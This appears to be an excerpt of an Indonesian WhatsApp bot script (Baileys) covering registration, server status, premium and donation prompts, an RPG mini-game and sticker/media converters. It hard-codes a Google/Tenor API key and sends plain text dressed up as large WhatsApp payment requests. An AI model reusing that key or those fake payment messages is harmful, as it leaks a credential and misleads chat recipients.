                                showAdAttribution: true,
                                title: 'SUCCESS REGISTER!!',
                                body: `Tanggal : ${hariini}`,
                                thumbnailUrl: 'https://telegra.ph/file/86bbc1a12f28505a2f031.jpg',
                                sourceUrl: 'https://chat.whatsapp.com/EKp2gQiS2pJ6oMPbeZ8Fc0',
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                } else {
                    addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
                    ndaa.sendMessage(m.chat, {
                        text: mzd,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'SUCCESS REGISTER!!',
                                body: `Tanggal : ${hariini}`,
                                thumbnailUrl: 'https://telegra.ph/file/86bbc1a12f28505a2f031.jpg',
                                sourceUrl: 'https://chat.whatsapp.com/EKp2gQiS2pJ6oMPbeZ8Fc0',
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                }
        break
            case  'capi': {
            if (!isCreator) return newReply(mess.owner)
            let anu = await fetchJson(`https://api.caliph.biz.id/users/cek?apikey=${caliph}`)
            let tks = `》Username : ${anu.username}\n》Limit : ${anu.limit}\n》Premium : ${anu.premium}\n》Expired : ${anu.expired}`
            ndaa.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                        currencyCodeIso4217: 'IDR',
                        amount1000: 30000000,
                        requestFrom: m.sender,
                        noteMessage: {
                        extendedTextMessage: {
                        text: tks,
                        contextInfo: {
                        externalAdReply: {
                        showAdAttribution: false
                        }}}}}}, {})
                    }
                break

            case 'ping':
            case 'botstatus':
            case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
                await ndaa.sendMessage(m.chat, {
                    text: respon,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: 'STATUS SERVER',
                            body: `${latensi.toFixed(4)} Second`,
                            thumbnailUrl: 'https://telegra.ph/file/05c3b67e766b157ca655f.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: ftroli
                })
            }
            break
            case 'buypremium':
            case 'premiumuser': {
                let teks = `Hi ${pushname}👋\n Ingin Beli Premium? Chat Saja Owner😉`
                await ndaa.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: 'BUY PREMIUM',
                            body: `15k / MONTH`,
                            thumbnailUrl: 'https://telegra.ph/file/c0cad5270a204eb878711.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: ftroli
                })
            }
            break
            case 'sewa':
            case 'sewabot':
                newReply(`Ketik ${prefix}owner Saja`)
                break
            case 'speedtest': {
                newReply('Testing Speed...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python speed.py')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) ndaa.sendMessage(m.chat, {
                        text: stdout,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'SPEED TEST',
                                body: `FORGET DONATE`,
                                thumbnailUrl: 'https://telegra.ph/file/ab32e2dba3bcb99dfec6a.jpg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    if (stderr.trim()) ndaa.sendMessage(m.chat, {
                        text: stderr,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'SPEED TEST',
                                body: `FORGET DONATE`,
                                thumbnailUrl: 'https://telegra.ph/file/ab32e2dba3bcb99dfec6a.jpg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                }
            }
            break
            case 'runtime':
                let pinga = `Bot Telah Berjalan Selama ${runtime(process.uptime())}`
                ndaa.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: 'RUNTIME',
                            body: `FORGET DONATE`,
                            thumbnailUrl: 'https://telegra.ph/file/e293453cd41317e7cf2a4.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: ftroli
                })
                break
                case 'rules': {
let teks = `*「  Rules ${namabot} 」*

• *Dilarang Keras Menelefon Bot*
• *Dilarang Spam Perintah Ke Bot*
• *Jika Mau Chat Admin Utamakan Salam*
• *Gausah Sok Asik Ngirim Virtex/Bug Ke Bot*

*Catatan:* _*Jika Ada Fitur Yang Error*_\_*nHarap Lapor Ke Owner Agar Segera Di Perbaiki*_`
ndaa.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                        currencyCodeIso4217: 'IDR',
                        amount1000: 30000000,
                        requestFrom: m.sender,
                        noteMessage: {
                        extendedTextMessage: {
                        text: teks,
                        contextInfo: {
                        externalAdReply: {
                        showAdAttribution: false
                        }}}}}}, {})
                    }
                break
            case 'script': case 'sc':{
let capn = `*✪ Script Bot ${namabot}*

 • Baileys : WhiskeySockets
 • Base : Arxzy
 • Fix Features : Ndaa

Harga Script? Tanya Ke .owner
© NdaaYT5`
await ndaa.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 30000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: capn,
contextInfo: {
externalAdReply: {
showAdAttribution: false
}}}}}}, {})
}
break
            case 'donate':
            case 'donasi':
                let katanya = `Hallo Kakak ${pushname}\n\nJika Ingin Berdonasi Menggunakan QRIS\n\n\n*NOTES:*\n 1.Bawa Bukti Telah Berdonasi Kepada Owner!!!\nSeberapa Pun Kakak Berdonasi Bagi Kami Sangat Berharga`
                ndaa.sendMessage(m.chat, {
                    image: fs.readFileSync('./media/qris.jpg'),
                    caption: katanya
                }, {
                    quoted: ftroli
                })
                break
            case 'payment':
                let katana = `Hallo Kakak ${pushname}\n\nJika Ingin Bayar Menggunakan QRIS\n\n\n*NOTES:*\n 1.Bawa Bukti Telah Transfer Kepada Owner!!!`
                ndaa.sendMessage(m.chat, {
                    image: fs.readFileSync('./media/qris.jpg'),
                    caption: katana
                }, {
                    quoted: ftroli
                })
                break
            case 'owner': 
        case 'creator': {
                const vcard =
                'BEGIN:VCARD\n' + // metadata of the contact card
                'VERSION:3.0\n' +
                `FN:${namaowner}\n` + // full name
                `ORG:${namabot};\n` + // the organization of the contact
                `TEL;type=MSG;type=CELL;type=VOICE;waid=${numberowner}:+${numberowner}\n` + // WhatsApp ID + phone number
                'END:VCARD'
            ndaa.sendMessage(m.chat, {
                contacts: {
                    displayName: namaowner,
                    contacts: [{ vcard }],
                },
            }, { quoted: fkontak })
               }
        break
            case 'tqto':
                newReply(`*Terima Kasih Kepada*\n\n>| 1. ArxzyDev ( Base )\n>| 2. Ndaa ( Fix )\n>| 3. LolHuman ( APi KEYs )\n> 4. CaliphDev ( APi KEYs )\n>| 5. Penyedia Module\n\n Powered By NdaaYT5`)
                break
            /* ~~~~~~~~~ RPG FITUR ~~~~~~~~~ */
case 'inventori': case 'inventory': case 'profile':{
if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
if (!isInventory){ addInventori(m.sender) }
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }

let teksehmazeh = `_[ INFO USER ]_\n\n`
teksehmazeh += `*◦ Darah kamu:* ${getDarah(m.sender)}\n`
teksehmazeh += `*◦ Besi kamu:* ${getBesi(m.sender)}\n`
teksehmazeh += `*◦ Emas Kamu:* ${getEmas(m.sender)}\n`
teksehmazeh += `*◦ Emerald Kamu:* ${getEmerald(m.sender)}\n`
teksehmazeh += `*◦ Limit kamu:* ${getLimit(m.sender)}\n`
teksehmazeh += `*◦ Potion Kamu:* ${getPotion(m.sender)}\n\n`
teksehmazeh += `_[ HASIL BURUAN ]_\n\n`
teksehmazeh += `*◦ Ikan:* ${getIkan(m.sender)}\n`
teksehmazeh += `*◦ Ayam:* ${getAyam(m.sender)}\n`
teksehmazeh += `*◦ Kelinci:* ${getKelinci(m.sender)}\n`
teksehmazeh += `*◦ Domba:* ${getDomba(m.sender)}\n`
teksehmazeh += `*◦ Sapi:* ${getSapi(m.sender)}\n`
teksehmazeh += `*◦ Gajah:* ${getGajah(m.sender)}`
newReply(teksehmazeh)
}
break
 case 'leaderboard':
{ 
let txt = `◦ *LEADERBOARD* \n\n`
for (let i of _buruan){
txt += `◦ *ID :* ${i.id}\n`
txt += `*◦ Ikan* : ${i.ikan}\n`
txt += `*◦ Ayam* : ${i.ayam}\n`
txt += `*◦ Kelinci* : ${i.kelinci}\n`
txt += `*◦ Domba* : ${i.domba}\n`
txt += `*◦ Sapi* : ${i.sapi}\n`
txt += `*◦ Gajah* : ${i.gajah}\n\n`
}
 newReply(txt)
}
 break
case 'mining': case 'mine':{
if (!isInventory){ addInventori(m.sender) }
if (isCekDarah < 1) return newReply(`Kamu kelelahan!, cobalah heal menggunakan potion`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( () => {
let caption = `[ Hasil Tambang ]\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
ndaa.sendMessage(m.chat, { image: { url: './media/tambang.jpg' }, caption: caption }, { quoted: m })
}, 7000)
setTimeout( () => {
newReply(`${pushname} Mulai Menambang`)
}, 1500)
kurangDarah(m.sender, 10)
addBesi(m.sender, besinya)
addEmas(m.sended, emasnya)
addEmerald(m.sender, emeraldnya)
}
break
//transaksi
 case 'beli': case 'buy':{
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 if (!q) return newReply(`Apa yg ingin kamu beli?\n\n1.potion\n2.baitfood\n\nContoh: ${prefix + command} baitfood`)
 var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
 if (!args[1]) return newReply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return newReply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
setTimeout( () => {
newReply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Potion Mu:* ${getPotion(m.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anu
 if (!args[1]) return newReply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return newReply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
setTimeout( () => {
newReply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Bait Food Mu:* ${getUmpan(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
 if (!args[1]) return newReply(`Contoh : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
 if (isMonay < noh) return newReply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
setTimeout( () => {
newReply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Your Limit* : ${getLimit(m.sender)}`)
}, 2000) 
} else { newReply("Incorrect Format!") }
 }
 break
 
 case 'sell': case 'jual':{
 if (!q) newReply(`What Do You Want To Sell??\nContoh : ${prefix + command} fish 2`)
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 var anu = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anu) return newReply(`Kamu Tidak Memiliki Cukup Ikan Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return newReply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m.sender, anu)
 let monaynya = 1500 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
newReply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ikan Mu:* ${getIkan(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < anu) return newReply(`Kamu Tidak Memiliki Cukup Ayam Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return newReply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m.sender, anu)
 let monaynya = 2500 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
newReply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ayam Mu:* ${getAyam(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < anu) return newReply(`Kamu Tidak Memiliki Cukup Kelinci Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return newReply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
 let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
newReply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Kelinci Mu:* ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < anu) return newReply(`Kamu Tidak Memiliki Cukup Domba Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return newReply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
 let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
newReply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Domba Mu:* ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < anu) return newReply(`Kamu Tidak Memiliki Cukup Sapi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return newReply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
 let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
newReply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Sapi Mu:* ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < anu) return newReply(`Kamu Tidak Memiliki Cukup Gajah Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return newReply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
 let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
newReply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Gajahmu:* ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anu) return newReply(`Kamu Tidak Memiliki Cukup Besi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return newReply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m.sender, anu)
 let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
newReply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Besi Mu:* ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anu) return newReply(`Kamu Tidak Memiliki Cukup Emas Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return newReply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
 let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
newReply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emas Mu:* ${getEmas(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return newReply(`Kamu Tidak Memiliki Cukup Emerald Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return newReply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
 let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
newReply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emerald Mu:* ${getEmerald(m.sender)}`)
}, 2000) 
 } else { newReply("Incorrect Format!") }
 }
 break
 case 'heal':{
 if (!isCekDarah < 1) return newReply('Kamu Hanya Bisa Menggunakannya Saat Darahmu 0')
 if (isCekDarah > 100) return newReply('Darahmu Masih Full')
 if (isPotion < 1) return newReply(`Kamu Tidak Punya Potion, Belilah dengan cara #buypotion _jumlah_`) 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 newReply('Success! Darahmu Full Kembali')
 }
 break 
 case 'hunt': case 'hunting': case'berburu':{
 if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (isCekDarah < 1) return newReply('Your Blood Is Gone, Try To Heal Using Potions') 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
let luka = ["Tertusuk Duri Saat Berburu","Terpleset Ke Jurang Saat Berburu","Tertangkap Hewan Buas","Tidak Berhati-hati","Terjerat Akar","Terjatuh Saat berburu"]
let location = ["Hutan","Hutan Amazon","Hutan Tropis","Padang Rumput","Hutan Afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)] 
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
 if (lokasinya === 'Hutan') {
 var image = './media/rimba.jpg'
} else
 if (lokasinya === 'Hutan Amazon') {
 var image ='./media/amazon.jpg'
} else
 if (lokasinya === 'Hutan Tropis') {
 var image = './media/tropis.jpg'
} else
 if (lokasinya === 'Padang Rumput') {
 var image = './media/padang_rumput.jpg'
} else
 if (lokasinya === 'Hutan Afrika') {
 var image = './media/afrika.jpg'
} else
 if (lokasinya === 'Pegunungan') {
var image = './media/pegunungan.jpg'
}
 setTimeout( () => {
let teksehmazeh = `_[ Hasil Berburu ]_\n`
teksehmazeh += `*◦ Ikan* : ${ikanmu}\n`
teksehmazeh += `*◦ Ayam* : ${ayam}\n`
teksehmazeh += `*◦ Kelinci* : ${kelinci}\n`
teksehmazeh += `*◦ Domba* : ${domba}\n`
teksehmazeh += `*◦ Sapi* : ${sapi}\n`
teksehmazeh += `*◦ Gajah* : ${gajah}\n\n`
teksehmazeh += `_[ INFO ]_\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Luka* : ${lukanya}, Darah - 10\n`
teksehmazeh += `*Sisa Darah* : ${getDarah(m.sender)}\n`
ndaa.sendMessage(m.chat, { image: { url: image }, caption: teksehmazeh }, { quoted: m })
}, 5000)
setTimeout( () => {
newReply(`${pushname} Mulai Berburu Di ${lokasinya}`)
}, 1000) 
 addIkan(m.sender, ikanmu) 
addAyam(m.sender, ayam) 
addKelinci(m.sender, kelinci)
addDomba(m.sender, domba)
addSapi(m.sender, sapi)
addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break
                /* ~~~~~~~~~ CONVERT FEATURES ~~~~~~~~~ */
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return newReply(`Balas Video/Image Dengan Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await ndaa.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
                    let media = await quoted.download()
                    let encmedia = await ndaa.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return newReply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
            case 'smeme': {
                let respond = `Kirim/Reply image/sticker dengan caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return newReply(respond)
                if (!text) return newReply(respond)
                newReply(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await ndaa.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await ndaa.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
            case 'swm': {
                let [teks1, teks2] = text.split`|`
                if (!teks1) return newReply(`Kirim/Reply image/video dengan caption ${prefix + command} teks1|teks2`)
                if (!teks2) return newReply(`Kirim/Reply image/video dengan caption ${prefix + command} teks1|teks2`)
                newReply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await ndaa.downloadMediaMessage(qmsg)
                    let encmedia = await ndaa.sendImageAsSticker(m.chat, media, m, {
                        packname: teks1,
                        author: teks2
                    })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
                    let media = await ndaa.downloadMediaMessage(qmsg)
                    let encmedia = await ndaa.sendVideoAsSticker(m.chat, media, m, {
                        packname: teks1,
                        author: teks2
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return newReply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return newReply(`Reply sticker dengan caption *${prefix + command}*`)
                newReply(mess.wait)
                let media = await ndaa.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    ndaa.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: ftroli
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
          case 'tomp4': case 'tovideo': {
                if (!quoted) return newReply('Reply Image')
                if (!/webp/.test(mime)) return newReply(`reply sticker with caption *${prefix + command}*`)
                newReply(mess.wait)
                let { webp2mp4File } = require('./lib/uploader.js')
                let media = await ndaa.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await ndaa.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: ftroli })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Kirim/newReply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
                newReply(mess.wait)
                let media = await ndaa.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                ndaa.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: ftroli
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Kirim/newReply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
                newReply(mess.wait)
                let media = await ndaa.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                ndaa.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `ndaa-MD.mp3`
                }, {
                    quoted: ftroli
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`newReply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
                newReply(mess.wait)
                let media = await ndaa.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter.js')
                let audio = await toPTT(media, 'mp4')
                ndaa.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: ftroli
                })

            }
            break
            case 'toptv':{
            if (!isCreator) return newReply(mess.owner)
            if (!quoted) throw `Balas Video Dengan Caption ${prefix + command}`
            if (/video/.test(mime)) {
            var ppt = quoted
            var ptv = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
            "ptvMessage": ppt
            }), { userJid: m.chat, quoted:m})
            ndaa.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
            }
            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return newReply(`newReply stiker dengan caption *${prefix + command}*`)
                newReply(mess.wait)
                let media = await ndaa.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await ndaa.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: ftroli
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                newReply(mess.wait)
                let media = await ndaa.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                let anu = await TelegraPh(media)
                let mono = '```'
                let txt = `${mono}Convert Image To Url${mono}\n\n🖨 Link: ${util.format(anu)}\n❌ Exp: *No Expired*`
                await ndaa.sendMessage(m.chat, { text: txt }, {quoted: m})
                await fs.unlinkSync(media)
            }
            }
            break
            case 'snobg': {
                let respond = `Kirim Atau Reply Gambar Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) return newReply(respond)
                let dwnld = await ndaa.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.lolhuman.xyz/api/removebg?apikey=${lol}&img=${fatGans}`
                let pop = await ndaa.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
            case 'emojimix2': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return newReply(`Contoh : ${prefix + command} 😅+🤔`)
                if (!emoji2) return newReply(`Contoh : ${prefix + command} 😅+🤔`)
                newReply(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await ndaa.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'emojimix1': {
                if (!text) return newReply(`Contoh : ${prefix + command} 😅`)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
